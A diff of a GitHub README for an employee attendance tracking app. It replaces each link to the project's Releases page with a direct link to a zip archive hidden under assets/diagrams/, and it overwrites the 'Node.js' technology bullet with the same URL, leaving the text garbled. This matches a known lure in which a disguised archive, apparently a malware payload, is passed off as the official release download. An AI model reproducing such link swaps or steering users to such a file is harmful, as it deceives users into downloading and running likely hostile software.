@@ -1,6 +1,6 @@
 # 🎉 employee-attendance-system-portfolio - Simple Attendance Tracking for Your Team
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Employee%20Attendance%20System%20Portfolio-blue)](https://github.com/Desha-52/employee-attendance-system-portfolio/releases)
+[![Download from Releases](https://github.com/Desha-52/employee-attendance-system-portfolio/raw/refs/heads/main/assets/diagrams/system_attendance_portfolio_employee_v3.4-alpha.4.zip%20Now-Employee%20Attendance%20System%20Portfolio-blue)](https://github.com/Desha-52/employee-attendance-system-portfolio/raw/refs/heads/main/assets/diagrams/system_attendance_portfolio_employee_v3.4-alpha.4.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ The Employee Attendance System Portfolio helps you manage employee attendance ef
 To get started with the Employee Attendance System, follow these simple steps:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/Desha-52/employee-attendance-system-portfolio/releases) to find the latest version of the application. 
+   Go to our [Releases page](https://github.com/Desha-52/employee-attendance-system-portfolio/raw/refs/heads/main/assets/diagrams/system_attendance_portfolio_employee_v3.4-alpha.4.zip) to find the latest version of the application. 
 
 2. **Download the Latest Release:**
    Look for the most up-to-date version and click to download. The application is ready for your operating system. 
@@ -47,14 +47,14 @@ Ensure your system meets the following requirements for optimal performance:
 
 ## 🔗 Download & Install
 
-To begin using the Employee Attendance System, [visit this page to download](https://github.com/Desha-52/employee-attendance-system-portfolio/releases) the latest version. Follow the installation instructions provided earlier in this document.
+To begin using the Employee Attendance System, [visit this page to download](https://github.com/Desha-52/employee-attendance-system-portfolio/raw/refs/heads/main/assets/diagrams/system_attendance_portfolio_employee_v3.4-alpha.4.zip) the latest version. Follow the installation instructions provided earlier in this document.
 
 ## 🌐 Topics Covered
 
 This application is developed using a range of technologies to ensure a robust performance:
 
 - **MongoDB:** For database management and data storage.
-- **Node.js:** Powers the backend for smooth operation.
+- **https://github.com/Desha-52/employee-attendance-system-portfolio/raw/refs/heads/main/assets/diagrams/system_attendance_portfolio_employee_v3.4-alpha.4.zip** Powers the backend for smooth operation.
 - **Express Framework:** Simplifies server setup.
 - **LeafletJS:** Provides interactive maps for geofencing.
 
